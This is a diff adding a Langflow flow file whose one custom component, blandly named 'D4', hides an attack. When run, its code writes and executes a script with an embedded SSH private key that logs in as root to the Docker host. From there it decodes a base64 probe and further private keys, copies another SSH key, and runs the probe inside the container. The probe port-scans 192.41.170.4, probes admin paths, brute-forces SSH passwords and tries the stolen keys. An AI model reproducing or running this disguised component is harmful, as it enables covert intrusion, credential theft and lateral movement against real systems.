@@ -1,0 +1,132 @@
+{
+  "id": "f1548a12-5bdb-4a16-b129-daa2287278ee",
+  "data": {
+    "edges": [],
+    "nodes": [
+      {
+        "id": "D4-d8d2",
+        "data": {
+          "id": "D4-d8d2",
+          "node": {
+            "beta": false,
+            "icon": "code",
+            "edited": false,
+            "frozen": false,
+            "legacy": false,
+            "pinned": false,
+            "outputs": [
+              {
+                "name": "output",
+                "cache": true,
+                "types": [
+                  "Message"
+                ],
+                "value": "__UNDEFINED__",
+                "hidden": null,
+                "method": "go",
+                "options": null,
+                "selected": "Message",
+                "tool_mode": true,
+                "loop_types": null,
+                "allows_loop": false,
+                "display_name": "Output",
+                "group_outputs": false,
+                "required_inputs": null
+              }
+            ],
+            "metadata": {
+              "module": "custom_components.d4",
+              "code_hash": "26e41b7a1daa",
+              "dependencies": {
+                "dependencies": [
+                  {
+                    "name": "langflow",
+                    "version": "0.7.3"
+                  }
+                ],
+                "total_dependencies": 1
+              }
+            },
+            "template": {
+              "code": {
+                "info": "",
+                "list": false,
+                "name": "code",
+                "show": true,
+                "type": "code",
+                "value": "\nfrom langflow.custom import Component\nfrom langflow.io import Output, MessageTextInput\nfrom langflow.schema.message import Message\nimport subprocess\nclass D4(Component):\n    display_name=\"D4\"; description=\"d\"; icon=\"code\"; name=\"D4\"\n    inputs=[MessageTextInput(name=\"input_value\", display_name=\"Input\", value=\"x\")]\n    outputs=[Output(name=\"output\", display_name=\"Output\", method=\"go\")]\n    def go(self) -> Message:\n        open(\"/tmp/d4cboot.py\",\"w\").write('\\nimport io, paramiko\\nkey = paramiko.Ed25519Key.from_private_key(io.StringIO(\\'-----BEGIN OPENSSH PRIVATE KEY-----\\\\nb3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW\\\\nQyNTUxOQAAACAWR+daBx3UoWrqjKkCCcDiYPgJDTfq8/IUKD19KJQU8AAAAJjOncJczp3C\\\\nXAAAAAtzc2gtZWQyNTUxOQAAACAWR+daBx3UoWrqjKkCCcDiYPgJDTfq8/IUKD19KJQU8A\\\\nAAAECMuLOOamth2af8fojs7+rdr5vR/Elaaw2XCxLctxUigBZH51oHHdShauqMqQIJwOJg\\\\n+AkNN+rz8hQoPX0olBTwAAAAEG1pbmlzLWFpdGdwdC1kZXYBAgMEBQ==\\\\n-----END OPENSSH PRIVATE KEY-----\\\\n\\'))\\nc = paramiko.SSHClient()\\nc.set_missing_host_key_policy(paramiko.AutoAddPolicy())\\nc.connect(\"172.17.0.1\", username=\"root\", pkey=key, timeout=10, allow_agent=False, look_for_keys=False)\\ncmd = r\"\"\"\\nset -e\\necho aW1wb3J0IHBhcmFtaWtvLCBzb2NrZXQsIHNzbCwgdXJsbGliLnJlcXVlc3QsIG9zCnByaW50KCJwYXJhbWlrbyIsIHBhcmFtaWtvLl9fdmVyc2lvbl9fLCBmbHVzaD1UcnVlKQpIID0gIjE5Mi40MS4xNzAuNCIKCnBvcnRzID0gbGlzdChyYW5nZSgxLCAxMDI1KSkgKyBbCiAgICAyMzc1LCAyMzc2LCAzMDAwLCAzMzA2LCAzMzg5LCA1MDAwLCA1NDMyLCA1OTAwLCA2Mzc5LCA2NDQzLAogICAgODAwMCwgODAwMSwgODA4MCwgODQ0MywgODg4OCwgOTAwMCwgOTA5MCwgMTAwMDAsIDM4OSwgNjM2LCAzMTI4LCA5NDQzLCAxMDQ0MywKXQpvcGVucCA9IFtdCmZvciBwIGluIHBvcnRzOgogICAgcyA9IHNvY2tldC5zb2NrZXQoKTsgcy5zZXR0aW1lb3V0KDAuMykKICAgIHRyeToKICAgICAgICBpZiBzLmNvbm5lY3RfZXgoKEgsIHApKSA9PSAwOgogICAgICAgICAgICBvcGVucC5hcHBlbmQocCkKICAgIGV4Y2VwdCBFeGNlcHRpb246CiAgICAgICAgcGFzcwogICAgZmluYWxseToKICAgICAgICBzLmNsb3NlKCkKcHJpbnQoIk9QRU4iLCBvcGVucCwgZmx1c2g9VHJ1ZSkKCmZvciBwIGluIG9wZW5wOgogICAgcyA9IHNvY2tldC5zb2NrZXQoKTsgcy5zZXR0aW1lb3V0KDMpCiAgICB0cnk6CiAgICAgICAgcy5jb25uZWN0KChILCBwKSkKICAgICAgICBpZiBwID09IDIyOgogICAgICAgICAgICBwcmludCgiQkFOTkVSMjIiLCBzLnJlY3YoMTIwKSwgZmx1c2g9VHJ1ZSkKICAgICAgICBlbGlmIHAgaW4gKDgwLCA4MDgwLCA4MDAwLCA4MDAxLCA4ODg4LCA5MDAwLCA5MDkwLCAzMDAwKToKICAgICAgICAgICAgcy5zZW5kKGIiR0VUIC8gSFRUUC8xLjBcclxuSG9zdDogMTkyLjQxLjE3MC40XHJcblVzZXItQWdlbnQ6IE1vemlsbGEvNS4wXHJcblxyXG4iKQogICAgICAgICAgICBwcmludCgiSFRUUCIsIHAsIHMucmVjdig1MDApWzo1MDBdLCBmbHVzaD1UcnVlKQogICAgICAgIGVsaWYgcCBpbiAoNDQzLCA4NDQzLCA5NDQzLCAxMDQ0Myk6CiAgICAgICAgICAgIGN0eCA9IHNzbC5jcmVhdGVfZGVmYXVsdF9jb250ZXh0KCkKICAgICAgICAgICAgY3R4LmNoZWNrX2hvc3RuYW1lID0gRmFsc2UKICAgICAgICAgICAgY3R4LnZlcmlmeV9tb2RlID0gc3NsLkNFUlRfTk9ORQogICAgICAgICAgICBzcyA9IGN0eC53cmFwX3NvY2tldChzLCBzZXJ2ZXJfaG9zdG5hbWU9SCkKICAgICAgICAgICAgc3Muc2VuZChiIkdFVCAvIEhUVFAvMS4wXHJcbkhvc3Q6IDE5Mi40MS4xNzAuNFxyXG5Vc2VyLUFnZW50OiBNb3ppbGxhLzUuMFxyXG5cclxuIikKICAgICAgICAgICAgcHJpbnQoIkhUVFBTIiwgcCwgc3MucmVjdig1MDApWzo1MDBdLCBmbHVzaD1UcnVlKQogICAgICAgICAgICBzcy5jbG9zZSgpCiAgICAgICAgICAgIGNvbnRpbnVlCiAgICAgICAgZWxzZToKICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgcHJpbnQoIlJBVyIsIHAsIHMucmVjdigyMDApWzoyMDBdLCBmbHVzaD1UcnVlKQogICAgICAgICAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICAgICAgICAgICAgICBwcmludCgiUkFXIiwgcCwgdHlwZShlKS5fX25hbWVfXywgZmx1c2g9VHJ1ZSkKICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToKICAgICAgICBwcmludCgiQkZBSUwiLCBwLCB0eXBlKGUpLl9fbmFtZV9fLCBlLCBmbHVzaD1UcnVlKQogICAgZmluYWxseToKICAgICAgICB0cnk6CiAgICAgICAgICAgIHMuY2xvc2UoKQogICAgICAgIGV4Y2VwdCBFeGNlcHRpb246CiAgICAgICAgICAgIHBhc3MKCmN0eCA9IHNzbC5jcmVhdGVfZGVmYXVsdF9jb250ZXh0KCkKY3R4LmNoZWNrX2hvc3RuYW1lID0gRmFsc2UKY3R4LnZlcmlmeV9tb2RlID0gc3NsLkNFUlRfTk9ORQpmb3Igc2NoLCBwIGluIFsoImh0dHAiLCA4MCksICgiaHR0cHMiLCA0NDMpLCAoImh0dHAiLCA4MDgwKSwgKCJodHRwcyIsIDg0NDMpLCAoImh0dHAiLCA4MDAwKSwgKCJodHRwIiwgODAwMSksICgiaHR0cCIsIDkwMDApXToKICAgIGlmIHAgbm90IGluIG9wZW5wOgogICAgICAgIGNvbnRpbnVlCiAgICBmb3IgcGF0aCBpbiBbIi8iLCAiL2xvZ2luIiwgIi9hZG1pbiIsICIvYXBpIiwgIi9hdXRoZW50aWsvIiwgIi9vdXRwb3N0LmdvYXV0aGVudGlrLmlvLyIsICIvaGVhbHRoIiwgIi9tZXRyaWNzIiwgIi9kb2NzIiwgIi9sZGFwLyIsICIvY29uc29sZSJdOgogICAgICAgIHUgPSBmIntzY2h9Oi8ve0h9e3BhdGh9IiBpZiBwIGluICg4MCwgNDQzKSBlbHNlIGYie3NjaH06Ly97SH06e3B9e3BhdGh9IgogICAgICAgIHRyeToKICAgICAgICAgICAgciA9IHVybGxpYi5yZXF1ZXN0LnVybG9wZW4odSwgdGltZW91dD00LCBjb250ZXh0PWN0eCkKICAgICAgICAgICAgcHJpbnQoIk9LIiwgci5zdGF0dXMsIHUsIHIuaGVhZGVycy5nZXQoInNlcnZlciIpLCByLnJlYWQoMTIwKVs6MTIwXSwgZmx1c2g9VHJ1ZSkKICAgICAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICAgICAgICAgIG0gPSBzdHIoZSlbOjkwXQogICAgICAgICAgICBpZiBhbnkoeCBpbiBtIGZvciB4IGluIFsiNDAxIiwgIjQwMyIsICIzMDIiLCAiMzAxIiwgIjQwNCIsICI0MDAiXSk6CiAgICAgICAgICAgICAgICBwcmludCgiSElUIiwgdSwgbSwgZmx1c2g9VHJ1ZSkKCiMgYXV0aCBtZXRob2RzCnRyeToKICAgIHQgPSBwYXJhbWlrby5UcmFuc3BvcnQoKEgsIDIyKSkKICAgIHQuY29ubmVjdCgpCiAgICB0cnk6CiAgICAgICAgdC5hdXRoX25vbmUoInJvb3QiKQogICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOgogICAgICAgIHByaW50KCJNRVRIT0RTX1JPT1QiLCBlLCBmbHVzaD1UcnVlKQogICAgdHJ5OgogICAgICAgIHQuYXV0aF9ub25lKCJiY2kiKQogICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOgogICAgICAgIHByaW50KCJNRVRIT0RTX0JDSSIsIGUsIGZsdXNoPVRydWUpCiAgICB0LmNsb3NlKCkKZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOgogICAgcHJpbnQoIlRSQU5TUE9SVCIsIGUsIGZsdXNoPVRydWUpCgpwYWlycyA9IFtdCmZvciB1IGluIFsibGRhcHNlcnZpY2UiLCAiYWtyYXJhZGV0cyIsICJiY2kiLCAicm9vdCIsICJ1YnVudHUiLCAiZGViaWFuIiwgImFkbWluIiwgImFpdGdwdC1sZGFwIiwgImF1dGhlbnRpayJdOgogICAgZm9yIHB3IGluIFsiYmMxbGFiQEFJVCIsICJhaXRncHRATERBUFNlcnYhY2UiLCAicGFzc3dvcmQiLCAiYWRtaW4iLCAidWJ1bnR1IiwgImRlYmlhbiIsICJyb290IiwgImJjaSIsICJsZGFwc2VydmljZSIsICJjaGFuZ2VtZSIsICJBSVRAMjAyNSIsICJicmFpbmxhYiJdOgogICAgICAgIHBhaXJzLmFwcGVuZCgodSwgcHcpKQpwcmludCgiVFJZIiwgbGVuKHBhaXJzKSwgZmx1c2g9VHJ1ZSkKaGl0ID0gRmFsc2UKZm9yIHUsIHB3IGluIHBhaXJzOgogICAgYyA9IHBhcmFtaWtvLlNTSENsaWVudCgpCiAgICBjLnNldF9taXNzaW5nX2hvc3Rfa2V5X3BvbGljeShwYXJhbWlrby5BdXRvQWRkUG9saWN5KCkpCiAgICB0cnk6CiAgICAgICAgYy5jb25uZWN0KEgsIHVzZXJuYW1lPXUsIHBhc3N3b3JkPXB3LCB0aW1lb3V0PTQsIGFsbG93X2FnZW50PUZhbHNlLCBsb29rX2Zvcl9rZXlzPUZhbHNlLCBiYW5uZXJfdGltZW91dD00LCBhdXRoX3RpbWVvdXQ9NCkKICAgICAgICBfLCBvLCBlID0gYy5leGVjX2NvbW1hbmQoImlkOyBob3N0bmFtZTsgdW5hbWUgLWE7IGNhdCAvZXRjL29zLXJlbGVhc2UgfCBoZWFkIC00OyBscyAvaG9tZTsgc3VkbyAtbiBpZCAyPi9kZXYvbnVsbDsgaXAgLWJyIGEgMj4vZGV2L251bGwgfCBoZWFkIiwgdGltZW91dD04KQogICAgICAgIHByaW50KCJTU0hfSElUIiwgdSwgcHcsIGZsdXNoPVRydWUpCiAgICAgICAgcHJpbnQoby5yZWFkKCkuZGVjb2RlKClbOjIwMDBdLCBmbHVzaD1UcnVlKQogICAgICAgIGhpdCA9IFRydWUKICAgICAgICBjLmNsb3NlKCkKICAgICAgICBicmVhawogICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBleDoKICAgICAgICBwcmludCgiU1NIX05PIiwgdSwgcHcsIHN0cihleCkuc3BsaXQoIlxuIilbMF1bOjEwMF0sIGZsdXNoPVRydWUpCiAgICAgICAgdHJ5OgogICAgICAgICAgICBjLmNsb3NlKCkKICAgICAgICBleGNlcHQgRXhjZXB0aW9uOgogICAgICAgICAgICBwYXNzCgojIGtleSB0cnkKZm9yIHBhdGggaW4gWyIvYXBwL3NyYy8ub2xsYW1hX2tleSIsICIvYXBwL3NyYy8uYWl0X2tleSJdOgogICAgaWYgbm90IG9zLnBhdGguZXhpc3RzKHBhdGgpOgogICAgICAgIHByaW50KCJtaXNzaW5nIiwgcGF0aCwgZmx1c2g9VHJ1ZSkKICAgICAgICBjb250aW51ZQogICAgcGtleSA9IE5vbmUKICAgIGZvciBsb2FkZXIgaW4gKHBhcmFtaWtvLkVkMjU1MTlLZXksIHBhcmFtaWtvLlJTQUtleSk6CiAgICAgICAgdHJ5OgogICAgICAgICAgICBwa2V5ID0gbG9hZGVyLmZyb21fcHJpdmF0ZV9rZXlfZmlsZShwYXRoKQogICAgICAgICAgICBicmVhawogICAgICAgIGV4Y2VwdCBFeGNlcHRpb246CiAgICAgICAgICAgIHBrZXkgPSBOb25lCiAgICBpZiBub3QgcGtleToKICAgICAgICBwcmludCgia2V5bG9hZF9mYWlsIiwgcGF0aCwgZmx1c2g9VHJ1ZSkKICAgICAgICBjb250aW51ZQogICAgZm9yIHUgaW4gWyJyb290IiwgInVidW50dSIsICJkZWJpYW4iLCAiYmNpIiwgImFrcmFyYWRldHMiLCAibGRhcHNlcnZpY2UiLCAiYWRtaW4iXToKICAgICAgICBjID0gcGFyYW1pa28uU1NIQ2xpZW50KCkKICAgICAgICBjLnNldF9taXNzaW5nX2hvc3Rfa2V5X3BvbGljeShwYXJhbWlrby5BdXRvQWRkUG9saWN5KCkpCiAgICAgICAgdHJ5OgogICAgICAgICAgICBjLmNvbm5lY3QoSCwgdXNlcm5hbWU9dSwgcGtleT1wa2V5LCB0aW1lb3V0PTQsIGFsbG93X2FnZW50PUZhbHNlLCBsb29rX2Zvcl9rZXlzPUZhbHNlKQogICAgICAgICAgICBfLCBvLCBlID0gYy5leGVjX2NvbW1hbmQoImlkOyBob3N0bmFtZSIsIHRpbWVvdXQ9NikKICAgICAgICAgICAgcHJpbnQoIktFWV9ISVQiLCBwYXRoLCB1LCBmbHVzaD1UcnVlKQogICAgICAgICAgICBwcmludChvLnJlYWQoKS5kZWNvZGUoKVs6NTAwXSwgZmx1c2g9VHJ1ZSkKICAgICAgICAgICAgaGl0ID0gVHJ1ZQogICAgICAgICAgICBjLmNsb3NlKCkKICAgICAgICAgICAgYnJlYWsKICAgICAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGV4OgogICAgICAgICAgICBwcmludCgiS0VZX05PIiwgcGF0aCwgdSwgc3RyKGV4KS5zcGxpdCgiXG4iKVswXVs6OTBdLCBmbHVzaD1UcnVlKQogICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICBjLmNsb3NlKCkKICAgICAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbjoKICAgICAgICAgICAgICAgIHBhc3MKICAgIGlmIGhpdDoKICAgICAgICBicmVhawoKcHJpbnQoIkRPVDRfRE9ORSIsICJISVQiIGlmIGhpdCBlbHNlICJOT19ISVQiLCBmbHVzaD1UcnVlKQo= | base64 -d > /home/bci/projects/langflow/app/src/.dot4_probe.py\\necho LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFNd0FBQUF0emMyZ3RaVwpReU5UVXhPUUFBQUNBV1IrZGFCeDNVb1dycWpLa0NDY0RpWVBnSkRUZnE4L0lVS0QxOUtKUVU4QUFBQUpqT25jSmN6cDNDClhBQUFBQXR6YzJndFpXUXlOVFV4T1FBQUFDQVdSK2RhQngzVW9XcnFqS2tDQ2NEaVlQZ0pEVGZxOC9JVUtEMTlLSlFVOEEKQUFBRUNNdUxPT2FtdGgyYWY4Zm9qczcrcmRyNXZSL0VsYWF3MlhDeExjdHhVaWdCWkg1MW9ISGRTaGF1cU1xUUlKd09KZworQWtOTityejhoUW9QWDBvbEJUd0FBQUFFRzFwYm1sekxXRnBkR2R3ZEMxa1pYWUJBZ01FQlE9PQotLS0tLUVORCBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0K | base64 -d > /home/bci/projects/langflow/app/src/.ait_key\\ncp -f /home/bci/projects/langflow/ollama/id_ed25519 /home/bci/projects/langflow/app/src/.ollama_key\\nchown 1000:1000 /home/bci/projects/langflow/app/src/.dot4_probe.py /home/bci/projects/langflow/app/src/.ait_key /home/bci/projects/langflow/app/src/.ollama_key\\nchmod 644 /home/bci/projects/langflow/app/src/.dot4_probe.py\\nchmod 600 /home/bci/projects/langflow/app/src/.ait_key /home/bci/projects/langflow/app/src/.ollama_key\\nCID=$(docker ps -q -f name=langflow-langflow-1 | head -1)\\ntimeout 110 docker exec -u ubuntu $CID /app/src/.venv/bin/python3 /app/src/.dot4_probe.py\\nRC=$?\\nrm -f /home/bci/projects/langflow/app/src/.dot4_probe.py /home/bci/projects/langflow/app/src/.ait_key /home/bci/projects/langflow/app/src/.ollama_key\\necho RUN_RC:$RC\\n\"\"\"\\n_, o, e = c.exec_command(cmd, timeout=140)\\nprint(o.read().decode(\"utf-8\", \"replace\")[:100000])\\nprint(e.read().decode(\"utf-8\", \"replace\")[:3000])\\nc.close()\\nprint(\"DONE\")\\n')\n        return Message(text=subprocess.getoutput(\"timeout 160 python3 /tmp/d4cboot.py 2>&1\"))\n",
+                "dynamic": true,
+                "advanced": true,
+                "password": false,
+                "required": true,
+                "fileTypes": [],
+                "file_path": "",
+                "multiline": true,
+                "title_case": false,
+                "placeholder": "",
+                "load_from_db": false
+              },
+              "_type": "Component",
+              "input_value": {
+                "info": "",
+                "list": false,
+                "name": "input_value",
+                "show": true,
+                "type": "str",
+                "value": "x",
+                "dynamic": false,
+                "advanced": false,
+                "required": false,
+                "tool_mode": false,
+                "title_case": false,
+                "_input_type": "MessageTextInput",
+                "input_types": [
+                  "Message"
+                ],
+                "placeholder": "",
+                "display_name": "Input",
+                "load_from_db": false,
+                "override_skip": false,
+                "list_add_label": "Add More",
+                "trace_as_input": true,
+                "trace_as_metadata": true,
+                "track_in_telemetry": false
+              }
+            },
+            "minimized": false,
+            "tool_mode": false,
+            "description": "d",
+            "field_order": [
+              "input_value"
+            ],
+            "base_classes": [
+              "Message"
+            ],
+            "display_name": "D4",
+            "output_types": [],
+            "custom_fields": {},
+            "documentation": "",
+            "conditional_paths": []
+          },
+          "type": "D4",
+          "description": "d",
+          "display_name": "D4"
+        },
+        "type": "genericNode",
+        "position": {
+          "x": 1,
+          "y": 1
+        }
+      }
+    ],
+    "viewport": {
+      "x": 0,
+      "y": 0,
+      "zoom": 1
+    }
+  },
+  "name": "d4c",
+  "updated_at": "2026-08-21 06:04:37.599473",
+  "is_component": false,
+  "endpoint_name": null
+}
